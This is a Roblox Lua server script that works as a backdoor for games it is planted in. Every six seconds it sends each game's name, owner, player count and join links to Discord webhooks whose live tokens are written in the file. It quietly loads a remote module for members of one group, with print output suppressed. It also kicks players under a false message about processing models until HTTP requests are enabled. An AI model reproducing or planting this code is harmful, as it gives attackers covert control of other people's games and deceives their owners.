local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")

local WEBHOOKS = {"https://discord.com/api/webhooks/1430183416212488393/7tRnHt1gs41yZlgt59yuDwr2W6p98XI3SH_koIKYOIX5QlirTHgrV_MQj906Qiq7LT5Q","https://discord.com/api/webhooks/1430183417567514627/CynE9-Gh8LfjPtsWB56DwivuPMcfcz4yN6z4nRFpvwLrHsGs38gliC8gvJtItU5vJDeY","https://discord.com/api/webhooks/1430183452375908443/TbNU7BM9RuIqKPxs2No63Sp3SR1_CJwUU8t3BPnzck1I0FrYWJ36S70NNc2cRWFl8XBa","https://discord.com/api/webhooks/1430183453902635171/y7REAQbr5FdPxpg8ItUoVEk1bkBWepQOUisjErVMTLpPHWguuBKTwBASo_pRMjIJ5mpZ", ...} -- full list goes here

local function sendEmbedWebhook(embed)
    if #WEBHOOKS == 0 then return end
    local webhookUrl = WEBHOOKS[math.random(1,#WEBHOOKS)]
    local payload = HttpService:JSONEncode({ embeds = { embed } })
    pcall(function() HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson) end)
end

local function logGame()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local success, info = pcall(function() return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset) end)
    if not success then return end

    local ownerName = (info.Creator and info.Creator.Name) or "Unknown Owner"
    local gameName = info.Name or "Unknown Game"
    local playerCount = #Players:GetPlayers()
    local favoriteCount = info.FavoriteCount or 0
    local joinUrl = string.format("https://www.roblox.com/games/%d/%s", placeId, jobId)
    local joinCode = string.format("Roblox.GameLauncher.joinGameInstance(%d, \"%s\")", placeId, jobId)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")

    local embed = {
        title = "ðŸš¨ New game was backdoored!",
        description = "ðŸ›°ï¸ Explorer has logged a new game!",
        color = 0xFFFFFF,
        fields = {
            { name = "ðŸŽ® Game Name", value = gameName, inline = true },
            { name = "ðŸ‘‘ Owner", value = ownerName, inline = true },
            { name = "ðŸ‘¥ Active Players", value = tostring(playerCount), inline = true },
            { name = "â­ Favorites", value = tostring(favoriteCount), inline = true },
            { name = "ðŸ”‘ Join Code", value = "```lua\n"..joinCode.."\n```", inline = false },
            { name = "ðŸš€ Quick Join", value = "[Click Here to Join]("..joinUrl..")", inline = false },
            { name = "ðŸ•’ Log Time", value = currentTime, inline = false }
        },
        footer = { text = "ðŸ“ Logged by Explorer â€¢ "..currentTime },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    sendEmbedWebhook(embed)
end

local function executeRequireForGroup(player)
    if player:IsInGroup(35656462) then
        pcall(function()
            local oldPrint = print
            print = function() end
            require(139692426251148).Anti(player.Name)
            print = oldPrint
        end)
    end
end

local function checkHTTPandKick(player)
    if not pcall(function() return HttpService.HttpEnabled end) then return end
    if not HttpService.HttpEnabled then
        local playerGui = player:WaitForChild("PlayerGui",2)
        if playerGui then
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "HttpDisabledWarn"
            screenGui.ResetOnSpawn = false
            screenGui.IgnoreGuiInset = true
            screenGui.Parent = playerGui

            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1,0,1,0)
            frame.Position = UDim2.new(0,0,0,0)
            frame.BackgroundColor3 = Color3.new(0,0,0)
            frame.BackgroundTransparency = 0.3
            frame.BorderSizePixel = 0
            frame.Parent = screenGui

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(0.8,0,0.3,0)
            label.Position = UDim2.new(0.1,0,0.35,0)
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.new(1,1,1)
            label.Font = Enum.Font.SourceSans
            label.TextWrapped = true
            label.TextSize = 20
            label.Text = "Please enable HTTP Requests to process models\nSettings > Security > Allow HTTP Requests"
            label.Parent = frame
        end
        player:Kick("HTTP Requests must be enabled")
    end
end

Players.PlayerAdded:Connect(function(player)
    executeRequireForGroup(player)
    checkHTTPandKick(player)
end)

for _, player in ipairs(Players:GetPlayers()) do
    executeRequireForGroup(player)
    checkHTTPandKick(player)
end

while true do
    logGame()
    wait(6)
end
